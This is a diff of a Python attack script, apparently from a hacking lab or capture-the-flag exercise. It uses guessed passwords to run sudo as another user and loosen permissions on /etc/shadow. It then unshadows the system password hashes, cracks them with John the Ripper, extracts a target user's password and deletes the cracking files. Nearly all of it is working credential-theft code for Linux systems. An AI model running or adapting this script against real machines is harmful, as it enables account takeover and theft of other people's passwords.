@@ -36,14 +36,12 @@ sys_admin_password = findWord(my_dict.split(),sys_admin_password)
 print(boss_password)
 print(sys_admin_password)
 
-#set premission
-temp = f"su {bossName} -c \"echo {boss_password} | sudo -S chmod 640 /etc/shadow\""
-myOutput2 = subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = boss_password , stderr=subprocess.STDOUT, shell = True)
+
 
 #John the ripper 
-subprocess.run("unshadow /etc/passwd /etc/shadow > /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
-subprocess.run("john --wordlist=/usr/share/john/password.lst /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
-myOutPut = (subprocess.run("john --show /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True))
+subprocess.run("unshadow /etc/passwd /etc/shadow > /tmp/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, input = boss_password , stderr=subprocess.STDOUT, shell = True)
+subprocess.run("john --wordlist=/usr/share/john/password.lst /tmp/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
+myOutPut = (subprocess.run("john --show /tmp/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True))
 splited = (str(myOutPut).split(":"))
 for x in range(len(splited)):
 	if bodyName in splited[x]:
@@ -53,3 +51,8 @@ for x in range(len(splited)):
 
 subprocess.run("rm -r /root/.john", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
 subprocess.run("rm /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
+
+
+#set premission
+temp = f"su {bossName} -c \"echo {boss_password} | sudo -S chmod 640 /etc/shadow\""
+myOutput2 = subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = boss_password , stderr=subprocess.STDOUT, shell = True)
